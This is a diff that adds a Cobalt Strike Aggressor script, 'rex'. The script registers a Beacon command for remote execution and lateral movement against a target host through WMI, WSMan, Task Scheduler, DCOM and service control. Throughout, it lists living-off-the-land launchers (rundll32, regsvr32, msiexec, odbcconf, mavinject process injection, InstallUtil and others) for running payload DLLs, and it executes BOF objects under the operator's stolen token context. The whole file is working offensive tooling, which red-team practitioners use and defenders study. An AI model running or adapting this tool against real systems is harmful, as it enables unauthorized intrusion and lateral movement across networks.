@@ -1,0 +1,646 @@
+beacon_command_register(
+    "rex",
+    "Execute one registered remote-execution technique against one target",
+    "Synopsis: rex <technique> --target <host> [technique options]\n" .
+    "Run `rex help`, `rex help <technique>`, or `rex launchers` for contextual usage."
+);
+
+# Sleep has no structs, so launcher descriptors use one DTO-shaped hash each.
+# The CNA resolves these operator-layer contracts into the primitive BOF's
+# existing program/arguments or complete-command fields.
+%REX_LAUNCHERS = %(
+    "rundll32.exe" => %(
+        payload_type => "dll", program => "rundll32.exe",
+        arguments => "{remote_path},{entry_point}", entry_point => 1
+    ),
+    "rundll32.exe (advpack RegisterOCX)" => %(
+        payload_type => "dll", program => "rundll32.exe",
+        arguments => "advpack.dll,RegisterOCX {remote_path}"
+    ),
+    "msiexec.exe (/y)" => %(
+        payload_type => "dll", program => "msiexec.exe",
+        arguments => "/y {remote_path}"
+    ),
+    "msiexec.exe (/z)" => %(
+        payload_type => "dll", program => "msiexec.exe",
+        arguments => "/z {remote_path}"
+    ),
+    "odbcconf.exe" => %(
+        payload_type => "dll", program => "odbcconf.exe",
+        arguments => "/a {REGSVR {remote_path}}", literal_braces => 1
+    ),
+    "regsvr32.exe" => %(
+        payload_type => "dll", program => "regsvr32.exe",
+        arguments => "/s {remote_path}"
+    ),
+    "regsvr32.exe (/u)" => %(
+        payload_type => "dll", program => "regsvr32.exe",
+        arguments => "/s /u {remote_path}"
+    ),
+    "regsvr32.exe (/i)" => %(
+        payload_type => "dll", program => "regsvr32.exe",
+        arguments => "/s /n /i {remote_path}"
+    ),
+    "regsvr32.exe (/u /i)" => %(
+        payload_type => "dll", program => "regsvr32.exe",
+        arguments => "/s /u /n /i {remote_path}"
+    ),
+    "control.exe" => %(
+        payload_type => "cpl", program => "control.exe",
+        arguments => "{remote_path}"
+    ),
+    "mavinject.exe" => %(
+        payload_type => "dll", program => "mavinject.exe",
+        arguments => "{process_id} /INJECTRUNNING {remote_path}", process_id => 1
+    ),
+    "RegAsm.exe" => %(
+        payload_type => "managed",
+        program => "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe",
+        arguments => "{remote_path}"
+    ),
+    "RegAsm.exe (/U)" => %(
+        payload_type => "managed",
+        program => "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe",
+        arguments => "/U {remote_path}"
+    ),
+    "RegSvcs.exe" => %(
+        payload_type => "managed",
+        program => "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe",
+        arguments => "{remote_path}"
+    ),
+    "RegSvcs.exe (/U)" => %(
+        payload_type => "managed",
+        program => "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegSvcs.exe",
+        arguments => "/U {remote_path}"
+    ),
+    "InstallUtil.exe" => %(
+        payload_type => "managed",
+        program => "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+        arguments => "/LogFile= /LogToConsole=false {remote_path}"
+    ),
+    "InstallUtil.exe (/U)" => %(
+        payload_type => "managed",
+        program => "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe",
+        arguments => "/LogFile= /LogToConsole=false /U {remote_path}"
+    ),
+    "custom" => %(custom => 1)
+);
+
+sub rex_general_help {
+    blog($1,
+        "usage: rex <technique> --target <host> [technique options]\n" .
+        "       rex preflight <technique> --target <host> [technique options]\n" .
+        "       rex techniques\n" .
+        "       rex launchers\n" .
+        "       rex help <technique>\n" .
+        "techniques: WMIProvider, WMIService, WMIExec, WSManExec, " .
+        "TaskSchedExec, DCOMIShellDispatch2, SCMChangeService, SCMCreateService\n" .
+        "identity: rex uses the active Beacon token context"
+    );
+}
+
+sub rex_technique_help {
+    local('$launcher_help $usage');
+
+    if ($2 eq "WMIExec") {
+        $usage = "rex WMIExec --target <host> (--command <command-line> | <launcher options>)";
+    }
+    else if ($2 eq "WMIService" || $2 eq "SCMChangeService" || $2 eq "SCMCreateService") {
+        $usage = "rex " . $2 . " --target <host> --service-name <name> --remote-path <service-exe>";
+    }
+    else if ($2 eq "TaskSchedExec") {
+        $usage = "rex TaskSchedExec --target <host> --task-name <name> (--program <executable> [--arguments <arguments>] | <launcher options>)";
+    }
+    else if ($2 eq "WSManExec") {
+        $usage = "rex WSManExec --target <host> (--program <executable> [--arguments <arguments>] | <launcher options>) [--transport <http[:port]|https[:port]>]";
+    }
+    else if ($2 eq "DCOMIShellDispatch2") {
+        $usage = "rex DCOMIShellDispatch2 --target <host> (--program <executable> [--arguments <arguments>] | <launcher options>)";
+    }
+    else if ($2 eq "WMIProvider") {
+        $usage = "rex WMIProvider --target <host> --provider-name <name> --provider-clsid <{GUID}> --remote-path <provider-dll>";
+    }
+    else {
+        berror($1, "unknown rex technique: " . $2);
+        rex_general_help($1);
+        return;
+    }
+
+    $launcher_help = "";
+    if (rex_launcher_technique($2)) {
+        $launcher_help =
+            "launcher options: --payload-type <dll|cpl|managed> --remote-path <target-file> " .
+            "--launcher <selector>; run `rex launchers` for built-in and custom contracts\n";
+    }
+
+    blog($1,
+        "usage: " . $usage . "\n" . $launcher_help .
+        "preflight: prefix the technique with `preflight` and use the same options\n" .
+        "identity: rex uses the active Beacon token context"
+    );
+}
+
+sub rex_preflight_help {
+    blog($1,
+        "usage: rex preflight <technique> --target <host> [technique options]\n" .
+        "runs the technique's remote prerequisite checks and skips execution\n" .
+        "referenced payloads must already exist remotely, but preflight does not verify them\n" .
+        "preflight may produce authentication, WMI, DCOM, RPC, or WSMan telemetry"
+    );
+}
+
+sub rex_techniques {
+    blog($1,
+        "WMIExec: --command\n" .
+        "WMIService: --service-name, --remote-path\n" .
+        "SCMChangeService: --service-name, --remote-path\n" .
+        "SCMCreateService: --service-name, --remote-path\n" .
+        "TaskSchedExec: --task-name, --program, optional --arguments\n" .
+        "WSManExec: --program, optional --arguments and --transport\n" .
+        "DCOMIShellDispatch2: --program, optional --arguments\n" .
+        "WMIProvider: --provider-name, --provider-clsid, --remote-path\n" .
+        "command-capable selectors also accept an explicit launcher contract\n" .
+        "all selectors: --target; identity is inherited from the active Beacon token"
+    );
+}
+
+sub rex_launchers {
+    blog($1,
+        "dll: rundll32.exe; rundll32.exe (advpack RegisterOCX); " .
+        "msiexec.exe (/y); msiexec.exe (/z); odbcconf.exe; " .
+        "regsvr32.exe; regsvr32.exe (/u); regsvr32.exe (/i); " .
+        "regsvr32.exe (/u /i); mavinject.exe\n" .
+        "cpl: control.exe\n" .
+        "managed: RegAsm.exe; RegAsm.exe (/U); RegSvcs.exe; " .
+        "RegSvcs.exe (/U); InstallUtil.exe; InstallUtil.exe (/U)\n" .
+        "requirements: rundll32.exe requires --entry-point; mavinject.exe requires " .
+        "--process-id; --launcher-program overrides a built-in executable path\n" .
+        "custom: --launcher custom --launcher-program <absolute-exe> " .
+        "--launcher-arguments <template>\n" .
+        "placeholders: {remote_path}; optional {entry_point}, {process_id}\n" .
+        "quote selector values that contain spaces or parentheses\n" .
+        "launcher files must already exist on the target; rex does not stage or remove them"
+    );
+}
+
+sub rex_known_technique {
+    return $1 eq "WMIProvider" || $1 eq "WMIService" || $1 eq "WMIExec" ||
+        $1 eq "WSManExec" || $1 eq "TaskSchedExec" ||
+        $1 eq "DCOMIShellDispatch2" || $1 eq "SCMChangeService" ||
+        $1 eq "SCMCreateService";
+}
+
+sub rex_object_name {
+    if ($1 eq "WMIProvider") { return "wmiprovider"; }
+    if ($1 eq "WMIService") { return "wmiservice"; }
+    if ($1 eq "WMIExec") { return "wmiexec"; }
+    if ($1 eq "WSManExec") { return "wsmanexec"; }
+    if ($1 eq "TaskSchedExec") { return "taskschedexec"; }
+    if ($1 eq "DCOMIShellDispatch2") { return "dcomishelldispatch2"; }
+    if ($1 eq "SCMChangeService") { return "scmchangeservice"; }
+    if ($1 eq "SCMCreateService") { return "scmcreateservice"; }
+    return "";
+}
+
+sub rex_launcher_technique {
+    return $1 eq "WMIExec" || $1 eq "WSManExec" ||
+        $1 eq "TaskSchedExec" || $1 eq "DCOMIShellDispatch2";
+}
+
+sub rex_known_launcher {
+    local('$descriptor');
+    $descriptor = %REX_LAUNCHERS[$1];
+    if ($descriptor is $null) { return 0; }
+    return 1;
+}
+
+sub rex_contains {
+    local('$position');
+    $position = indexOf($1, $2);
+    if ($position is $null) { return 0; }
+    return 1;
+}
+
+sub rex_single_line {
+    if (rex_contains($1, "\x00")) { return 0; }
+    if (rex_contains($1, "\r")) { return 0; }
+    if (rex_contains($1, "\n")) { return 0; }
+    return 1;
+}
+
+sub rex_absolute_drive_path {
+    if (strlen($1) < 4) { return 0; }
+    if (substr($1, 1, 2) ne ":") { return 0; }
+    if (substr($1, 2, 3) ne "\\") { return 0; }
+    if (rex_contains($1, "\"")) { return 0; }
+    if (!rex_single_line($1)) { return 0; }
+    return 1;
+}
+
+sub rex_quote_command_part {
+    if (rex_contains($1, " ") || rex_contains($1, "\t")) {
+        return "\"" . $1 . "\"";
+    }
+    return $1;
+}
+
+sub rex_render_launcher_arguments {
+    local('$rendered');
+    $rendered = strrep($1, "{remote_path}", rex_quote_command_part($2));
+    $rendered = strrep($rendered, "{entry_point}", $3);
+    $rendered = strrep($rendered, "{process_id}", $4);
+    return $rendered;
+}
+
+sub rex_known_option {
+    return $1 eq "--target" || $1 eq "--command" || $1 eq "--service-name" ||
+        $1 eq "--remote-path" || $1 eq "--task-name" || $1 eq "--program" ||
+        $1 eq "--arguments" || $1 eq "--transport" || $1 eq "--provider-name" ||
+        $1 eq "--provider-clsid" || $1 eq "--payload-type" || $1 eq "--launcher" ||
+        $1 eq "--launcher-program" || $1 eq "--launcher-arguments" ||
+        $1 eq "--entry-point" || $1 eq "--process-id";
+}
+
+sub rex_launcher_option {
+    return $1 eq "--payload-type" || $1 eq "--launcher" ||
+        $1 eq "--launcher-program" || $1 eq "--launcher-arguments" ||
+        $1 eq "--entry-point" || $1 eq "--process-id";
+}
+
+sub rex_option_allowed {
+    if ($2 eq "--target") {
+        return 1;
+    }
+    if (rex_launcher_technique($1) &&
+        (rex_launcher_option($2) || $2 eq "--remote-path")) {
+        return 1;
+    }
+    if ($1 eq "WMIExec") {
+        return $2 eq "--command";
+    }
+    if ($1 eq "WMIService" || $1 eq "SCMChangeService" || $1 eq "SCMCreateService") {
+        return $2 eq "--service-name" || $2 eq "--remote-path";
+    }
+    if ($1 eq "TaskSchedExec") {
+        return $2 eq "--task-name" || $2 eq "--program" || $2 eq "--arguments";
+    }
+    if ($1 eq "WSManExec") {
+        return $2 eq "--program" || $2 eq "--arguments" || $2 eq "--transport";
+    }
+    if ($1 eq "DCOMIShellDispatch2") {
+        return $2 eq "--program" || $2 eq "--arguments";
+    }
+    if ($1 eq "WMIProvider") {
+        return $2 eq "--provider-name" || $2 eq "--provider-clsid" || $2 eq "--remote-path";
+    }
+    return 0;
+}
+
+sub rex_require_option {
+    if (!$2) {
+        berror($1, $4 . " requires " . $3);
+        rex_technique_help($1, $4);
+        return 0;
+    }
+    return 1;
+}
+
+alias rex {
+    local('$action $arch $bid $flag $handle $index $object $object_name $packed');
+    local('$primary $secondary $selector $target $tertiary $value');
+    local('$entry_point $expected_type $launcher $launcher_descriptor $launcher_mode');
+    local('$launcher_program $launcher_template $payload_type $process_id $resolved_arguments');
+    # %request is the normalized operator request DTO. %seen preserves the
+    # difference between an omitted option and an explicitly empty value.
+    # %resolved_launcher is the program/arguments DTO consumed by primitives.
+    local('%request %resolved_launcher %seen');
+
+    $bid = $1;
+    if (size(@_) < 2) {
+        rex_general_help($bid);
+        return;
+    }
+
+    $action = "execute";
+    $selector = @_[1];
+    if ($selector eq "help") {
+        if (size(@_) == 2) {
+            rex_general_help($bid);
+        }
+        else if (size(@_) == 3 && @_[2] eq "preflight") {
+            rex_preflight_help($bid);
+        }
+        else if (size(@_) == 3) {
+            rex_technique_help($bid, @_[2]);
+        }
+        else {
+            berror($bid, "usage: rex help [technique]");
+        }
+        return;
+    }
+    if ($selector eq "techniques") {
+        if (size(@_) != 2) {
+            berror($bid, "usage: rex techniques");
+            return;
+        }
+        rex_techniques($bid);
+        return;
+    }
+    if ($selector eq "launchers") {
+        if (size(@_) != 2) {
+            berror($bid, "usage: rex launchers");
+            return;
+        }
+        rex_launchers($bid);
+        return;
+    }
+    if ($selector eq "preflight") {
+        if (size(@_) < 3) {
+            rex_preflight_help($bid);
+            return;
+        }
+        $action = "preflight";
+        $selector = @_[2];
+        $index = 3;
+    }
+    else {
+        $index = 2;
+    }
+    if (!rex_known_technique($selector)) {
+        berror($bid, "unknown rex technique: " . $selector);
+        rex_general_help($bid);
+        return;
+    }
+
+    while ($index < size(@_)) {
+        $flag = @_[$index];
+        if ($flag eq "--help") {
+            rex_technique_help($bid, $selector);
+            return;
+        }
+        if (!rex_known_option($flag)) {
+            berror($bid, "unknown rex option: " . $flag);
+            rex_technique_help($bid, $selector);
+            return;
+        }
+        if (!rex_option_allowed($selector, $flag)) {
+            berror($bid, $flag . " is not valid for " . $selector);
+            rex_technique_help($bid, $selector);
+            return;
+        }
+        if (%seen[$flag]) {
+            berror($bid, "duplicate rex option: " . $flag);
+            return;
+        }
+        if ($index + 1 >= size(@_)) {
+            berror($bid, "missing value for " . $flag);
+            return;
+        }
+        $value = @_[$index + 1];
+        %request[$flag] = $value;
+        %seen[$flag] = 1;
+        $index = $index + 2;
+    }
+
+    if (!rex_require_option($bid, %seen["--target"], "--target", $selector)) {
+        return;
+    }
+    $launcher_mode = %seen["--payload-type"] || %seen["--launcher"] ||
+        %seen["--launcher-program"] || %seen["--launcher-arguments"] ||
+        %seen["--entry-point"] || %seen["--process-id"] ||
+        (rex_launcher_technique($selector) && %seen["--remote-path"]);
+    %resolved_launcher = %(program => "", arguments => "");
+    if ($launcher_mode) {
+        if (!rex_launcher_technique($selector)) {
+            berror($bid, "launcher options are not valid for " . $selector);
+            return;
+        }
+        if (!rex_require_option($bid, %seen["--payload-type"], "--payload-type", $selector)) { return; }
+        if (!rex_require_option($bid, %seen["--remote-path"], "--remote-path", $selector)) { return; }
+        if (!rex_require_option($bid, %seen["--launcher"], "--launcher", $selector)) { return; }
+
+        $payload_type = %request["--payload-type"];
+        if ($payload_type ne "dll" && $payload_type ne "cpl" && $payload_type ne "managed") {
+            berror($bid, "--payload-type must be dll, cpl, or managed in launcher mode");
+            return;
+        }
+        if (!rex_absolute_drive_path(%request["--remote-path"])) {
+            berror($bid, "--remote-path must be a single-line absolute drive path without quotes");
+            return;
+        }
+
+        $launcher = %request["--launcher"];
+        if (!rex_known_launcher($launcher)) {
+            berror($bid, "unsupported --launcher selector: " . $launcher);
+            rex_launchers($bid);
+            return;
+        }
+        $launcher_descriptor = %REX_LAUNCHERS[$launcher];
+        $expected_type = $launcher_descriptor["payload_type"];
+        if (!$launcher_descriptor["custom"] && $payload_type ne $expected_type) {
+            berror($bid, "--launcher " . $launcher . " requires --payload-type " . $expected_type);
+            return;
+        }
+
+        $entry_point = "";
+        if (%seen["--entry-point"]) {
+            $entry_point = %request["--entry-point"];
+        }
+        if (%seen["--entry-point"] &&
+            !("$entry_point" ismatch '^[A-Za-z_][A-Za-z0-9_@?]*$|^#[0-9]+$')) {
+            berror($bid, "--entry-point is not a valid exported name or ordinal");
+            return;
+        }
+        $process_id = "";
+        if (%seen["--process-id"]) {
+            $process_id = %request["--process-id"];
+            if (!("$process_id" ismatch '^[0-9]+$') || $process_id == 0) {
+                berror($bid, "--process-id must be a positive decimal process identifier");
+                return;
+            }
+        }
+
+        if ($launcher_descriptor["custom"]) {
+            if (!rex_require_option($bid, %seen["--launcher-program"], "--launcher-program", $selector)) { return; }
+            if (!rex_require_option($bid, %seen["--launcher-arguments"], "--launcher-arguments", $selector)) { return; }
+            $launcher_program = %request["--launcher-program"];
+            $launcher_template = %request["--launcher-arguments"];
+            if (!rex_absolute_drive_path($launcher_program)) {
+                berror($bid, "custom --launcher-program must be a single-line absolute drive path without quotes");
+                return;
+            }
+            if (!rex_single_line($launcher_template) || !rex_contains($launcher_template, "{remote_path}")) {
+                berror($bid, "custom --launcher-arguments must be single-line and contain {remote_path}");
+                return;
+            }
+            if (rex_contains($launcher_template, "{process_id}") && !%seen["--process-id"]) {
+                berror($bid, "custom launcher template uses {process_id} but --process-id is missing");
+                return;
+            }
+            if (rex_contains($launcher_template, "{entry_point}") && !%seen["--entry-point"]) {
+                berror($bid, "custom launcher template uses {entry_point} but --entry-point is missing");
+                return;
+            }
+            if (%seen["--process-id"] && !rex_contains($launcher_template, "{process_id}")) {
+                berror($bid, "--process-id is not used by the custom launcher template");
+                return;
+            }
+            if (%seen["--entry-point"] && !rex_contains($launcher_template, "{entry_point}")) {
+                berror($bid, "--entry-point is not used by the custom launcher template");
+                return;
+            }
+        }
+        else {
+            if (%seen["--launcher-arguments"]) {
+                berror($bid, "--launcher-arguments requires --launcher custom");
+                return;
+            }
+            $launcher_program = $launcher_descriptor["program"];
+            $launcher_template = $launcher_descriptor["arguments"];
+            if (%seen["--launcher-program"]) {
+                $launcher_program = %request["--launcher-program"];
+                if (!rex_absolute_drive_path($launcher_program)) {
+                    berror($bid, "--launcher-program override must be a single-line absolute drive path without quotes");
+                    return;
+                }
+            }
+            if (%seen["--entry-point"] && !$launcher_descriptor["entry_point"]) {
+                berror($bid, "--entry-point is only used by rundll32.exe or a custom template");
+                return;
+            }
+            if ($launcher_descriptor["entry_point"] && !%seen["--entry-point"]) {
+                berror($bid, $launcher . " requires --entry-point");
+                return;
+            }
+            if ($launcher_descriptor["process_id"] && !%seen["--process-id"]) {
+                berror($bid, $launcher . " requires --process-id");
+                return;
+            }
+            if (%seen["--process-id"] && !$launcher_descriptor["process_id"]) {
+                berror($bid, "--process-id is only used by mavinject.exe or a custom template");
+                return;
+            }
+        }
+
+        %resolved_launcher = %(
+            program => $launcher_program,
+            arguments => rex_render_launcher_arguments(
+                $launcher_template, %request["--remote-path"], $entry_point, $process_id)
+        );
+        $resolved_arguments = %resolved_launcher["arguments"];
+        if (rex_contains($resolved_arguments, "{") ||
+            rex_contains($resolved_arguments, "}")) {
+            if (!$launcher_descriptor["literal_braces"] ||
+                !("$resolved_arguments" ismatch '^/a \\{REGSVR .+\\}$')) {
+                berror($bid, "launcher template contains an unknown or unexpanded placeholder");
+                return;
+            }
+        }
+    }
+
+    $primary = "";
+    $secondary = "";
+    $tertiary = "";
+    if ($selector eq "WMIExec") {
+        if ($launcher_mode) {
+            if (%seen["--command"]) {
+                berror($bid, "--command cannot be combined with launcher options");
+                return;
+            }
+            $primary = rex_quote_command_part(%resolved_launcher["program"]);
+            if (%resolved_launcher["arguments"] ne "") {
+                $primary = $primary . " " . %resolved_launcher["arguments"];
+            }
+        }
+        else {
+            if (!rex_require_option($bid, %seen["--command"], "--command", $selector)) { return; }
+            $primary = %request["--command"];
+        }
+    }
+    else if ($selector eq "WMIService" || $selector eq "SCMChangeService" || $selector eq "SCMCreateService") {
+        if (!rex_require_option($bid, %seen["--service-name"], "--service-name", $selector)) { return; }
+        if (!rex_require_option($bid, %seen["--remote-path"], "--remote-path", $selector)) { return; }
+        $primary = %request["--service-name"];
+        $secondary = %request["--remote-path"];
+    }
+    else if ($selector eq "TaskSchedExec") {
+        if (!rex_require_option($bid, %seen["--task-name"], "--task-name", $selector)) { return; }
+        $primary = %request["--task-name"];
+        if ($launcher_mode) {
+            if (%seen["--program"] || %seen["--arguments"]) {
+                berror($bid, "--program and --arguments cannot be combined with launcher options");
+                return;
+            }
+            $secondary = %resolved_launcher["program"];
+            $tertiary = %resolved_launcher["arguments"];
+        }
+        else {
+            if (!rex_require_option($bid, %seen["--program"], "--program", $selector)) { return; }
+            $secondary = %request["--program"];
+            if (%seen["--arguments"]) { $tertiary = %request["--arguments"]; }
+        }
+    }
+    else if ($selector eq "WSManExec") {
+        if ($launcher_mode) {
+            if (%seen["--program"] || %seen["--arguments"]) {
+                berror($bid, "--program and --arguments cannot be combined with launcher options");
+                return;
+            }
+            $primary = %resolved_launcher["program"];
+            $secondary = %resolved_launcher["arguments"];
+        }
+        else {
+            if (!rex_require_option($bid, %seen["--program"], "--program", $selector)) { return; }
+            $primary = %request["--program"];
+            if (%seen["--arguments"]) { $secondary = %request["--arguments"]; }
+        }
+        if (%seen["--transport"]) { $tertiary = %request["--transport"]; }
+    }
+    else if ($selector eq "DCOMIShellDispatch2") {
+        if ($launcher_mode) {
+            if (%seen["--program"] || %seen["--arguments"]) {
+                berror($bid, "--program and --arguments cannot be combined with launcher options");
+                return;
+            }
+            $primary = %resolved_launcher["program"];
+            $secondary = %resolved_launcher["arguments"];
+        }
+        else {
+            if (!rex_require_option($bid, %seen["--program"], "--program", $selector)) { return; }
+            $primary = %request["--program"];
+            if (%seen["--arguments"]) { $secondary = %request["--arguments"]; }
+        }
+    }
+    else if ($selector eq "WMIProvider") {
+        if (!rex_require_option($bid, %seen["--provider-name"], "--provider-name", $selector)) { return; }
+        if (!rex_require_option($bid, %seen["--provider-clsid"], "--provider-clsid", $selector)) { return; }
+        if (!rex_require_option($bid, %seen["--remote-path"], "--remote-path", $selector)) { return; }
+        $primary = %request["--provider-name"];
+        $secondary = %request["--provider-clsid"];
+        $tertiary = %request["--remote-path"];
+    }
+
+    $arch = barch($bid);
+    if ($arch ne "x64" && $arch ne "x86") {
+        berror($bid, "rex requires an x86 or x64 Beacon");
+        return;
+    }
+
+    $object_name = rex_object_name($selector);
+    $handle = openf(script_resource("rex_ $+ $object_name $+ . $+ $arch $+ .o"));
+    $object = readb($handle, -1);
+    closef($handle);
+    $target = %request["--target"];
+    $packed = bof_pack(
+        $bid, "zzzZZZ", $action, $target, $selector,
+        $primary, $secondary, $tertiary
+    );
+
+    if ($action eq "preflight") {
+        btask($bid, "rex preflight " . $selector . " against " . $target . " using the active token context");
+    }
+    else {
+        btask($bid, "rex " . $selector . " against " . $target . " using the active token context");
+    }
+    beacon_inline_execute($bid, $object, "go", $packed);
+}
